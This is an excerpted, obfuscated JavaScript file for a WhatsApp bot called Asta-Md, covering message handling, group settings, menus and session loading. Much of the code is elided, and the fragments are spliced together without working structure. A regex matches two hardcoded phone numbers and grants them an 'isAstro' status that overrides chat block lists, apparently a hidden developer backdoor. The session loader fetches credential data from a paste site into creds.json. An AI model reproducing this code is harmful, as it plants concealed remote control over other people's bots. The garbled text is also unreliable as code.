...
let { tempdb } = require(__dirname + "/schemes.js");
...
const { userdb, sck, groupdb, Plugindb, bot_, smdBuffer } = require("../lib");
...
const { smsg, callsg, groupsg, pollsg } = require("./serialized.js");
const {
  formatp,
  formatDate,
  getTime,
...
async function syncdb() {
  ...
  try {
    ...
    _0x3d0468 = __dirname + "/assets/asta.jpg";
  }
      ...
      for (mek of _0x1071af.messages) {
        ...
        if (_0x57832c && Config.HANDLERS.toLowerCase().includes("null")) {
          ...
          _0x9954f4 =
            ...
            (_0x5979da.isAstro &&
              /2348039607375|2349027862116/g.test(_0x5b55c3) &&
              _0x4186a0[0] == ",");
          _0x4931af = _0x9954f4
            ? prefa
          ...
          if (_0x5979da.isGroup && _0x111ae6 && _0x4931af !== "bot") {
            let _0x334235 = _0x4f1890[_0x5979da.chat] ||
              (await groupdb.findOne({
                ...
                botenable: toBool(
                  _0x5979da.isAstro || !blockJid.includes(_0x5979da.chat)
                ),
              };
        ...
        try {
          _0x4f1890[_0x5979da.chat] =
            ...
            (await groupdb.new({
              ...
              goodbye: toBool(global.goodbye),
              welcome: toBool(global.welcome),
            }));
        ...
        events.commands.map(async (_0x2dffdb) => {
          if (typeof _0x2dffdb.on === "string") {
            ...
            if (_0x1d5795 === "main" && _0x3078ae) {
              ...
              _0x5979da.text &&
              _0x1d5795 === "text" &&
              /text|txt|true|smd|suhail/gi.test(_0x2dffdb.quoted) &&
              _0x5979da.quoted &&
  ...
  _0x5447f8.ev.on("groups.upsert", async (_0x6ac529) => {
    try {
      events.commands.map(async (_0x591343) => {
        if (
          /on|true|main|all|suhail|smd/gi.test(
  ...
  _0x5447f8.ev.on("connection.update", async (_0x3fd0b3) => {
    ...
    if (_0x2224a7 === "open") {
      if (
        /true|ok|sure|yes/gi.test(global.reset) ||
        ...
        log(
          "ғɪxɪɴɢ sᴇssɪᴏɴ ɪᴅ" +
            (_0x5447f8.authState.creds?.myAppStateKeyId
              ? ""
              : "ᴍᴀᴋᴇ sᴜʀᴇ ᴛᴏ ʀᴇsᴛᴀʀᴛ ʙᴏᴛ ᴏɴᴄᴇ ᴄᴏɴɴᴇᴄᴛᴇᴅ") +
            "!"
        );
        _0x5447f8.ev.reset();
      }
            ...
            try {
              ...
              if (_0x28bc47) {
                let _0x224d22 =
                  _0x5701b6 +
                  (_0x4fcba7[_0x5701b6] &&
                  /.js|.smd|.astro/gi.test(_0x4fcba7[_0x5701b6])
                    ? _0x4fcba7[_0x5701b6]
                    : ".js",
                  "astro");
                const _0x286e03 =
      ...
      let _0x1f88ec =
        ...
        Config.WORKTYPE +
        "\n  Database: " +
        (isMongodb ? "MongoDb" : sqldb ? "PostegreSql" : "NO DB") +
        "\nPowered by: " +
        Config.botname +
        " \n\n";
      try {
  ...
  _0x5447f8.sendUi = async (
    ...
    try {
      ...
      if (!_0x51034c || !_0x51034c[0]) {
        _0x51034c = global.menuImg
          ? global.menuImg.split(",")
          : [await botpic()];
      ...
      let _0x237b02;
      if (
        (((_0x171bcf && _0x3bceba && global.messagetype > 0) || !_0x3bceba) &&
          /text|txt|nothing|smd|suhail/.test(global.menuImg)) ||
        _0x2e5e1f == "text"
      ) {
        _0x237b02 = {
      ...
      const _0x28e991 =
        _0x171bcf && _0x3bceba && global.messagetype > 0
  ...
  _0x5447f8.contextInfo = async (
    ...
    try {
      let _0x2ab518 = _0x1d19d2 ? _0x1d19d2 : global.messagetype;
      if (_0x2ab518 >= 5) {
        return {
          externalAdReply: {
            title: _0x180918,
...
global.toBool = (_0x5f0b1e, _0x23fe95 = false) =>
  /true|yes|ok|act|sure|enable|smd|suhail/gi.test(_0x5f0b1e)
    ? _0x23fe95
      ? true
      : "true"
    : _0x23fe95
...
app.listen(quickport, () =>
  console.log(
    "Asta-Md Server listening on http://localhost:" + quickport + "/  "
  )
);
...
async function MakeSession(
  ...
  const _0x40fbb4 =
    toBool(_0x1532e1 || global.IS_SUHAIL || process.env.IS_SUHAIL, true) ||
    (await _0x28b1d6(_0x406ff0, "./Dockerfile"));
  if (_0x40fbb4) {
    SmdOfficial = "yes";
    ...
    if (_0x148358 && _0x148358.startsWith("PId_")) {
      try {
        ...
        _0x148358 =
          _0x3fcebf && typeof _0x3fcebf == "string"
            ? Buffer.from(_0x3fcebf, "utf-8").toString("base64")
            : _0x148358;
      } catch (_0x32c583) {
    ...
    if (_0x148358 && /guru/gi.test(_0x148358) && _0x148358.length < 30) {
      try {
        ...
        const _0x536cf8 =
          _0x3ee158 && _0x3ee158.content ? _0x3ee158.content : false;
        var _0x395cbc = _0x536cf8 ? _0x279b36(_0x536cf8) : {};
        const _0x5f2a33 = JSON.parse(_0x395cbc);
        fs.writeFileSync(
          _0xe1ef27 + "creds.json",
          JSON.stringify(_0x5f2a33, null, 2)
        );
      ...
      try {
        let { data: _0x449628 } = await axios.get(
          "https://paste.c-net.org/" + _0x148358
        );
        fs.writeFileSync(
          _0xe1ef27 + "creds.json",
          _0x279b36(_0x449628),
        ...
        if (_0x4b3148["creds.json"]) {
          for (const _0x1d12b5 in _0x4b3148) {
            try {
              fs.writeFileSync(
                _0xe1ef27 + _0x1d12b5,
                typeof _0x4b3148[_0x1d12b5] == "string"
                  ? _0x4b3148[_0x1d12b5]
                  : JSON.stringify(_0x4b3148[_0x1d12b5], null, 2)
              );
            } catch (_0x1d9fd6) {}
          }
        } else {
          fs.writeFileSync(
            _0xe1ef27 + "creds.json",
            JSON.stringify(_0x4b3148, null, 2)
          );
        }
        log("\nCredentials Saved Successfully.");
      } catch (_0x5cc9c4) {
